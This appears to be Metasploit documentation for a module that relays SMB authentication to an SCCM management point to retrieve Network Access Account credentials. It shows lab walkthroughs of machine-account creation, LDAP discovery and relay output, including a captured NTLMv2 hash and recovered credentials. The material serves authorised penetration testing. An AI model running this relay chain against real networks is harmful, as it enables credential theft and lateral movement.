## Description
This module creates an SMB server and then relays the credentials passed to it to SCCM's HTTP server (aka Management Point)
to gain an authenticated connection. Once authenticated it then attempts to retrieve  the Network Access Account(s),
if configured, from the SCCM server. This requires a computer account,  which can be added using the samr_account module.

This module is essentially the `get_naa_credential` module with relaying capability.

The NAA account is used by some SCCM configurations in the policy deployment process. It does not require many privileges, but
in practice is often misconfigured to have excessive privileges.

The account can be retrieved in various ways, many requiring local administrative privileges on an existing host. However,
it can also be requested by an existing computer account, which by default most user accounts are able to create.


## Vulnerable Application
This module can be tested using the GOAD environment. Setup instructions can be found here:
https://github.com/Orange-Cyberdefense/GOAD

## Module usage
The `admin/dcerpc/samr_computer` module is generally used to first create a computer account, which requires no permissions:

1. From msfconsole
1. Do: `use auxiliary/admin/dcerpc/samr_account`
1. Set the `RHOSTS`, `SMBUser` and `SMBPass` options
   a. For the `ADD_COMPUTER` action, if you don't specify `ACCOUNT_NAME` or `ACCOUNT_PASSWORD` - one will be generated automatically
   b. For the `DELETE_ACCOUNT` action, set the `ACCOUNT_NAME` option
   c. For the `LOOKUP_ACCOUNT` action, set the `ACCOUNT_NAME` option
1. Run the module and see that a new machine account was added

Then use `ldap_query` to determine the `MANAGEMENT_POINT` and `SITE_CODE` values.

1. Do: `use gather/ldap_query`
1. Set: `DOMAIN` `RHOSTS` `USERNAME` `PASSWORD` `ACTION=RUN_SINGLE_QUERY` `QUERY_FILTER=(objectclass=mssmsmanagementpoint)` and `QUERY_ATTRIBUTES=cn,dnshostname,mssmssitecode`
1. Run the module and note the `dnshostname` and `mssmssitecode` values


Then the `auxiliary/server/relay/relay_get_naa_credentials` module can be used:

1. `use server/relay/relay_get_naa_credentials`
1. Set the `MANAGEMENT_POINT`, `SITE_CODE` 
1. Run the module to obtain the NAA credentials, if present.

The management point and site code can be retrieved using the `auxiliary/gather/ldap_query` module, using the `ENUM_SCCM_MANAGEMENT_POINTS` action.

See the Scenarios for a more detailed walk through

## Options

### RHOST, USERNAME, PASSWORD, DOMAIN, SESSION, RHOST
Options used to authenticate to the Domain Controller's LDAP service for SCCM autodiscovery.

### MANAGEMENT_POINT
The SCCM server.

### SITE_CODE
The Site Code of the management point.

### TIMEOUT
The number of seconds to wait for SCCM DB to update

## Scenarios
In the following example the user `ssccm.lab\eve` is a low-privilege user.

### Creating computer account

```
msf6 auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.lab username=eve password=iloveyou
[*] Running module against 192.168.33.10

[*] 192.168.33.10:445 - Adding computer
[+] 192.168.33.10:445 - Successfully created sccm.lab\DESKTOP-5FJM1832$
[+] 192.168.33.10:445 -   Password: JpnYZ43YHqmoOLj9xBKdI9tVFgDXtfsu
[+] 192.168.33.10:445 -   SID:      S-1-5-21-3875312677-2561575051-1173664991-1128
[*] Auxiliary module execution completed
```

### Manual discovery of SITE_CODE and MANAGEMENT_POINT using domain credentials

```
msf6 auxiliary(gather/ldap_query) > run domain=sccm.lab rhosts=192.168.56.10 username=eve password=iloveyou action=RUN_SINGLE_QUERY QUERY_FILTER=(objectclass=mssmsmanagementpoint) QUERY_ATTRIBUTES=cn,dnshostname,mssmssitecode
[*] Running module against 192.168.56.10
[*] 192.168.56.10:389 Discovered base DN: DC=sccm,DC=lab
[*] Sending single query (objectclass=mssmsmanagementpoint) to the LDAP server...
CN=SMS-MP-P01-MECM.SCCM.LAB,CN=System Management,CN=System,DC=sccm,DC=lab
=========================================================================

 Name           Attributes
 ----           ----------
 cn             SMS-MP-P01-MECM.SCCM.LAB
 dnshostname    MECM.sccm.lab
 mssmssitecode  P01

[*] Query returned 1 result.
[*] Auxiliary module execution completed
```

### Initiating SMB authentication from a Windows Host
Currently the SMB auth attempt must originate from a Windows Host, see: https://github.com/rapid7/metasploit-framework/issues/19951
```
net use \\192.168.56.1\foo /u:SCCM.LAB\DESKTOP-5FJM1832$ JpnYZ43YHqmoOLj9xBKdI9tVFgDXtfsu
```

### Running the module
```
msf6 exploit(windows/local/cve_2024_35250_ks_driver) > msf6 exploit(windows/local/cve_2024_35250_ks_driver) > use relay_get

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/server/relay/relay_get_naa_credentials  .                normal  Yes    SMB to HTTP relay version of Get NAA Creds


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/server/relay/relay_get_naa_credentials

[*] Using auxiliary/server/relay/relay_get_naa_credentials
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 auxiliary(server/relay/relay_get_naa_credentials) >  dns add-static mecm.sccm.lab 192.168.56.11
[*] Added static hostname mapping mecm.sccm.lab to 192.168.56.11
msf6 auxiliary(server/relay/relay_get_naa_credentials) > run rhost=192.168.56.11 smbdomain=sccm.lab MANAGEMENT_POINT=MECM.sccm.lab SITE_CODE=P01
[*] Auxiliary module running as background job 0.

[*] Checking endpoint on http://192.168.56.11:80/ccm_system_windowsauth/request
msf6 auxiliary(server/relay/relay_get_naa_credentials) > [*] SMB Server is running. Listening on 0.0.0.0:445
[*] Server started.
[*] New request from 192.168.56.1
[*] Received request for SCCM.LAB\DESKTOP-5FJM1832$
[*] Relaying to next target http://192.168.56.11:80/ccm_system_windowsauth/request
[+] Identity: SCCM.LAB\DESKTOP-5FJM1832$ - Successfully authenticated against relay target http://192.168.56.11:80/ccm_system_windowsauth/request
[SMB] NTLMv2-SSP Client     : 192.168.56.11
[SMB] NTLMv2-SSP Username   : SCCM.LAB\DESKTOP-5FJM1832$
[SMB] NTLMv2-SSP Hash       : DESKTOP-5FJM1832$::SCCM.LAB:42465e4768dcb113:c5248825d2326b730a23ff5986cc36d8:0101000000000000662037ebd78edb01344978b20c2f7baa0000000002000e005300430043004d004c0041004200010008004d00450043004d00040010007300630063006d002e006c006100620003001a004d00450043004d002e007300630063006d002e006c0061006200050010007300630063006d002e006c006100620007000800662037ebd78edb01060004000200000008003000300000000000000001000000002000002cd075c2fac7f6ea5a6a290f03ae2e6476afc69a4e85c3e91bab8a5ac0d7603e0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00350036002e0031000000000000000000

[+] This your capitan speaking we've reached the on_relay_success method :)
[*] Got SMS ID: D61057A2-0B02-40B3-9ADC-F349BA5EC8C2
[*] Waiting 10 seconds for SCCM DB to update...
[*] Found policy containing secrets: http://<mp>/SMS_MP/.sms_pol?{e98163c7-7b3a-4c3d-bb69-2b398c492290}.2_00
[+] Found valid NAA credentials: sccm.lab\sccm-naa:123456789
[*] Received request for SCCM.LAB\DESKTOP-5FJM1832$
[*] Identity: SCCM.LAB\DESKTOP-5FJM1832$ - All targets relayed to
[*] New request from 192.168.56.1
[*] Received request for SCCM.LAB\DESKTOP-5FJM1832$
[*] Identity: SCCM.LAB\DESKTOP-5FJM1832$ - All targets relayed to
[*] Received request for SCCM.LAB\DESKTOP-5FJM1832$
[*] Identity: SCCM.LAB\DESKTOP-5FJM1832$ - All targets relayed to
[*] Received request for SCCM.LAB\DESKTOP-5FJM1832$
[*] Identity: SCCM.LAB\DESKTOP-5FJM1832$ - All targets relayed to
```